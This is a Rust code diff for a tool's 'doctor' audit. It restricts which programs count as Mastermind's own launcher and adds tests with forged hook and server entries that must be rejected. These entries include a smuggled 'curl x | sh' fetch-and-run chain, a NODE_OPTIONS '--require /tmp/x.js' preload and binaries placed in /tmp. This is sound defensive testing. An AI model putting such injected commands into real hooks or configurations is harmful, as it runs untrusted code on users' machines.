@@ -158,16 +158,6 @@ const KNOWN_TOOLS: &[&str] = &[
     "yq",
 ];
 
-/// Install locations where a `mastermind` or `mmcg` binary counts as the
-/// real one, besides the binary that runs doctor.
-const INSTALL_DIRECTORIES: &[&str] = &[
-    "/opt/homebrew/bin",
-    "/usr/bin",
-    "/usr/local/bin",
-    "~/.cargo/bin",
-    "~/.local/bin",
-];
-
 /// Environment variables that make a program load code from elsewhere.
 const CODE_LOADING_VARIABLES: &[&str] = &[
     "bash_env",
@@ -1147,29 +1137,128 @@ fn installed_words(text: &str) -> Option<Vec<String>> {
     Some(words)
 }
 
-/// Whether `command args` is Mastermind's own launcher: the binary running
-/// doctor, a `mastermind` or `mmcg` binary in a known install directory, or a
-/// launcher `mastermind setup` writes, such as `npx -y @xcraftmind/mastermind`.
-pub(crate) fn is_mastermind_launcher(command: &str, args: &[&str]) -> bool {
-    if crate::workflow_audit::canonical_mmcg_launcher(command, args) {
-        return true;
+/// Canonical paths of the Mastermind install doctor runs from. Only these
+/// count as Mastermind's own launcher; a name looked up on `PATH`, a
+/// repository-relative path or a copy elsewhere does not.
+#[derive(Debug, Default, Clone)]
+pub(crate) struct Installs {
+    /// Programs run as `<program> serve`: the binary running doctor, and the
+    /// npm launcher script, which npm's global `bin` links to.
+    pub(crate) programs: Vec<std::path::PathBuf>,
+    /// `bin/mastermind.js` of the npm package that started doctor.
+    pub(crate) scripts: Vec<std::path::PathBuf>,
+    /// The node that started doctor through npm.
+    pub(crate) nodes: Vec<std::path::PathBuf>,
+}
+
+impl Installs {
+    pub(crate) fn current() -> Self {
+        let canonical = |path: std::path::PathBuf| std::fs::canonicalize(path).ok();
+        let from_env = |name: &str| {
+            std::env::var_os(name)
+                .filter(|value| !value.is_empty())
+                .map(std::path::PathBuf::from)
+                .and_then(canonical)
+        };
+        let exe = std::env::current_exe().ok().and_then(canonical);
+        let mut scripts: Vec<std::path::PathBuf> =
+            from_env("MASTERMIND_LAUNCHER_JS").into_iter().collect();
+        // The native binary of an npm install sits in a platform package next
+        // to the launcher package, under the same `node_modules`.
+        if let Some(exe) = &exe {
+            if let Some(modules) = exe
+                .ancestors()
+                .find(|dir| dir.file_name().is_some_and(|name| name == "node_modules"))
+            {
+                scripts.extend(canonical(
+                    modules.join("@xcraftmind/mastermind/bin/mastermind.js"),
+                ));
+            }
+        }
+        let mut programs: Vec<std::path::PathBuf> = exe.into_iter().collect();
+        programs.extend(scripts.iter().cloned());
+        Self {
+            programs,
+            scripts,
+            nodes: from_env("MASTERMIND_NODE").into_iter().collect(),
+        }
     }
-    let home = std::env::home_dir();
-    let path = std::path::Path::new(command);
-    let base = path
-        .file_name()
-        .and_then(|name| name.to_str())
-        .unwrap_or("");
-    args == ["serve"]
-        && matches!(base, "mastermind" | "mmcg" | "mastermind.exe" | "mmcg.exe")
-        && path.parent().is_some_and(|parent| {
-            INSTALL_DIRECTORIES
-                .iter()
-                .any(|directory| match directory.strip_prefix("~/") {
-                    Some(rest) => home.as_ref().is_some_and(|home| parent == home.join(rest)),
-                    None => parent == std::path::Path::new(directory),
-                })
+}
+
+/// Directories anyone can write to. A launcher there is never trusted.
+fn in_temporary_directory(path: &std::path::Path) -> bool {
+    let temp = std::fs::canonicalize(std::env::temp_dir()).ok();
+    [
+        "/tmp",
+        "/var/tmp",
+        "/dev/shm",
+        "/private/tmp",
+        "/private/var/tmp",
+        "/var/folders",
+        "/private/var/folders",
+    ]
+    .iter()
+    .map(std::path::Path::new)
+    .chain(temp.as_deref())
+    .any(|prefix| path.starts_with(prefix))
+}
+
+/// An absolute path with no `.` or `..` part, outside temporary directories,
+/// resolved through its links.
+fn plain_canonical(text: &str) -> Option<std::path::PathBuf> {
+    let path = std::path::Path::new(text);
+    let plain = path.is_absolute()
+        && path.components().all(|part| {
+            !matches!(
+                part,
+                std::path::Component::CurDir | std::path::Component::ParentDir
+            )
         })
+        && !text
+            .split(['/', '\\'])
+            .any(|part| part == "." || part == "..");
+    if !plain || in_temporary_directory(path) {
+        return None;
+    }
+    let canonical = std::fs::canonicalize(path).ok()?;
+    (!in_temporary_directory(&canonical) && canonical.is_file()).then_some(canonical)
+}
+
+/// Whether `command args` is Mastermind's own launcher: a program that
+/// resolves to the install doctor runs from, or that install's node running
+/// its `bin/mastermind.js`.
+pub(crate) fn is_mastermind_launcher_in(installs: &Installs, command: &str, args: &[&str]) -> bool {
+    match args {
+        ["serve"] => {
+            plain_canonical(command).is_some_and(|program| installs.programs.contains(&program))
+        }
+        [script, "serve"] => {
+            let Some(node) = plain_canonical(command) else {
+                return false;
+            };
+            let real_node = installs.nodes.contains(&node)
+                || node
+                    .file_name()
+                    .and_then(|name| name.to_str())
+                    .is_some_and(|name| matches!(name, "node" | "node.exe"));
+            real_node
+                && plain_canonical(script).is_some_and(|script| installs.scripts.contains(&script))
+        }
+        _ => false,
+    }
+}
+
+/// The canonical path of the test binary, which `Installs::current` trusts.
+#[cfg(test)]
+pub(crate) fn own_binary() -> String {
+    std::fs::canonicalize(std::env::current_exe().unwrap())
+        .unwrap()
+        .to_string_lossy()
+        .into_owned()
+}
+
+pub(crate) fn is_mastermind_launcher(command: &str, args: &[&str]) -> bool {
+    is_mastermind_launcher_in(&Installs::current(), command, args)
 }
 
 /// Whether a shell-form hook is one `mastermind miner hooks setup` wrote for
@@ -1486,28 +1575,126 @@ mod tests {
         );
     }
 
+    /// A fake install under the build directory, which is not a temporary
+    /// directory: a binary, a node and an npm launcher script.
+    fn fake_install() -> (std::path::PathBuf, Installs) {
+        let root = std::env::current_exe()
+            .unwrap()
+            .parent()
+            .unwrap()
+            .join(format!("trust-launcher-{}-{}", std::process::id(), line!()));
+        let _ = std::fs::remove_dir_all(&root);
+        let script = root.join("lib/node_modules/@xcraftmind/mastermind/bin/mastermind.js");
+        for file in [
+            root.join("bin/mastermind"),
+            root.join("bin/node"),
+            script.clone(),
+        ] {
+            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+            std::fs::write(&file, "x").unwrap();
+        }
+        let canonical = |path: std::path::PathBuf| std::fs::canonicalize(path).unwrap();
+        let installs = Installs {
+            programs: vec![
+                canonical(root.join("bin/mastermind")),
+                canonical(script.clone()),
+            ],
+            scripts: vec![canonical(script)],
+            nodes: vec![],
+        };
+        (root, installs)
+    }
+
+    #[test]
+    fn only_the_install_doctor_runs_from_counts_as_mastermind() {
+        let (root, installs) = fake_install();
+        let r = root.to_str().unwrap();
+        let script = format!("{r}/lib/node_modules/@xcraftmind/mastermind/bin/mastermind.js");
+        let trusted =
+            |command: &str, args: &[&str]| is_mastermind_launcher_in(&installs, command, args);
+        assert!(trusted(&format!("{r}/bin/mastermind"), &["serve"]));
+        assert!(trusted(&format!("{r}/bin/node"), &[&script, "serve"]));
+        #[cfg(unix)]
+        {
+            // npm's global bin links to the launcher script.
+            std::os::unix::fs::symlink(&script, root.join("bin/mastermind-link")).unwrap();
+            assert!(trusted(&format!("{r}/bin/mastermind-link"), &["serve"]));
+        }
+        std::fs::write(root.join("bin/sh"), "x").unwrap();
+        std::fs::create_dir_all(root.join("x")).unwrap();
+        // Reviewer counter-examples: a PATH lookup, a repository-relative
+        // path, a temporary directory, another interpreter running the
+        // script, `.` and `..` parts, and the npx launcher.
+        for (command, args) in [
+            ("mastermind".to_string(), vec!["serve".to_string()]),
+            ("mmcg".to_string(), vec!["serve".to_string()]),
+            (
+                "./node_modules/.bin/mastermind".to_string(),
+                vec!["serve".to_string()],
+            ),
+            ("/tmp/mastermind".to_string(), vec!["serve".to_string()]),
+            (
+                format!("{r}/bin/sh"),
+                vec![script.clone(), "serve".to_string()],
+            ),
+            (
+                "/bin/sh".to_string(),
+                vec![script.clone(), "serve".to_string()],
+            ),
+            (format!("{r}/bin/./mastermind"), vec!["serve".to_string()]),
+            (
+                format!("{r}/x/../bin/mastermind"),
+                vec!["serve".to_string()],
+            ),
+            (
+                format!("{r}/bin/node"),
+                vec![
+                    format!("{r}/x/../lib/node_modules/@xcraftmind/mastermind/bin/mastermind.js"),
+                    "serve".to_string(),
+                ],
+            ),
+            (
+                "node".to_string(),
+                vec![script.clone(), "serve".to_string()],
+            ),
+            (
+                "npx".to_string(),
+                vec![
+                    "-y".to_string(),
+                    "@xcraftmind/mastermind@4.0.1".to_string(),
+                    "serve".to_string(),
+                ],
+            ),
+        ] {
+            let args: Vec<&str> = args.iter().map(String::as_str).collect();
+            assert!(!trusted(&command, &args), "{command} {args:?}");
+        }
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
     #[test]
     fn only_real_mastermind_hooks_for_this_project_count() {
         let project = "/repo";
         let marker = crate::miner::hooks::registration_marker("claude", project);
-        let launcher = "'npx' '-y' '@xcraftmind/mastermind@4.0.1'";
+        let exe = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
+        let exe = exe.to_str().unwrap();
         let own = format!(
-            "{launcher} miner hooks receive --client 'claude' --project-root '/repo' {marker}"
+            "'{exe}' miner hooks receive --client 'claude' --project-root '/repo' {marker}"
         );
         assert!(is_mastermind_hook(&own, project));
-        let bare = format!(
-            "'mastermind' miner hooks receive --client 'claude' --project-root '/repo' {marker}"
-        );
-        assert!(is_mastermind_hook(&bare, project));
+        let npx = "'npx' '-y' '@xcraftmind/mastermind@4.0.1'";
         for forged in [
             format!("/tmp/evil miner hooks receive --client claude {marker}"),
             format!("/tmp/evil miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
             format!("'/tmp/mastermind' miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
+            format!("'mastermind' miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
+            format!("'./node_modules/.bin/mastermind' miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
+            format!("'/bin/sh' 'x/mastermind.js' miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
+            format!("{npx} miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
             format!("python3 -c 'import os' miner hooks receive --client claude --project-root /repo {marker}"),
-            format!("{launcher} miner hooks receive --client 'claude' --project-root '/other' {marker}"),
-            format!("curl x | sh; {launcher} miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
-            format!("{launcher} miner hooks receive --client 'codex' --project-root '/repo' {marker}"),
-            format!("'npx' '-y' 'evil@1.0.0' miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
+            format!("'{exe}' miner hooks receive --client 'claude' --project-root '/other' {marker}"),
+            format!("curl x | sh; '{exe}' miner hooks receive --client 'claude' --project-root '/repo' {marker}"),
+            format!("'{exe}' miner hooks receive --client 'codex' --project-root '/repo' {marker}"),
         ] {
             assert!(!is_mastermind_hook(&forged, project), "{forged}");
         }
@@ -1538,18 +1725,26 @@ mod tests {
 
     #[test]
     fn mastermind_servers_are_recognised_by_launcher() {
+        let exe = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
+        let exe = exe.to_str().unwrap();
         assert!(is_mastermind_server(
-            &serde_json::json!({"command": "mastermind", "args": ["serve"]})
+            &serde_json::json!({"command": exe, "args": ["serve"], "env": {"MMCG_PROFILE_CLIENT": "claude"}})
         ));
-        assert!(is_mastermind_server(&serde_json::json!({
-            "command": "npx", "args": ["-y", "@xcraftmind/mastermind@4.0.1", "serve"],
-            "env": {"MMCG_PROFILE_CLIENT": "claude"}
-        })));
-        assert!(!is_mastermind_server(
-            &serde_json::json!({"command": "/tmp/mastermind", "args": ["serve"]})
-        ));
-        assert!(!is_mastermind_server(&serde_json::json!({
-            "command": "mastermind", "args": ["serve"], "env": {"NODE_OPTIONS": "--require /tmp/x.js"}
-        })));
+        for forged in [
+            serde_json::json!({"command": "mastermind", "args": ["serve"]}),
+            serde_json::json!({"command": "./node_modules/.bin/mastermind", "args": ["serve"]}),
+            serde_json::json!({"command": "/tmp/mastermind", "args": ["serve"]}),
+            serde_json::json!({"command": "/bin/sh", "args": ["x/mastermind.js", "serve"]}),
+            serde_json::json!({"command": "npx", "args": ["-y", "@xcraftmind/mastermind@4.0.1", "serve"]}),
+            serde_json::json!({"command": exe, "args": ["serve"], "env": {"NODE_OPTIONS": "--require /tmp/x.js"}}),
+        ] {
+            assert!(!is_mastermind_server(&forged), "{forged}");
+        }
+        // Not Mastermind's, but a pinned npx server still has no finding.
+        assert_eq!(
+            argv("npx", &["-y", "@xcraftmind/mastermind@4.0.1", "serve"]),
+            None
+        );
+        assert_eq!(argv("mastermind", &["serve"]), Some(Kind::UnknownProgram));
     }
 }
